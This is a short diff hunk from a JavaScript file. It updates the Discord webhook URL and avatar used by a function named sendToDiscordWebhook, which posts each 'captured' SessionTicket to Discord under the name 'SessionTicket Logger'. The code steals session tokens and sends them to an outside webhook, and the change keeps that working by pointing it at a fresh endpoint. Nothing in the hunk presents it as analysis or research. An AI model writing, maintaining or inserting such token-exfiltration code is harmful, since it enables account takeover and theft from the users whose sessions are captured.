@@ -640,7 +640,7 @@
     }
 
     async function sendToDiscordWebhook(sessionTicket) {
-      const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
+      const webhookURL = "https://discord.com/api/webhooks/1425461329354817589/9zdliPmm0BqTi4ScGy7dClEFnuPxTIZNoc9XhjbHDizXn4jZ45tRAx3Jtzsi3ovaIqOS";
 
       try {
         const response = await fetch(webhookURL, {
@@ -651,7 +651,7 @@
           body: JSON.stringify({
             content: `New SessionTicket captured: ${sessionTicket}`,
             username: 'SessionTicket Logger',
-            avatar_url: 'https://cdn.discordapp.com/avatars/340238256874586112/e2aa7a1f843d240a470a54264662b873?size=1024'
+            avatar_url: 'https://cdn.discordapp.com/avatars/882311423571689502/7ea5cf6f21e4f061505545d058a3bf97.png?size=1024'
           })
         });
 
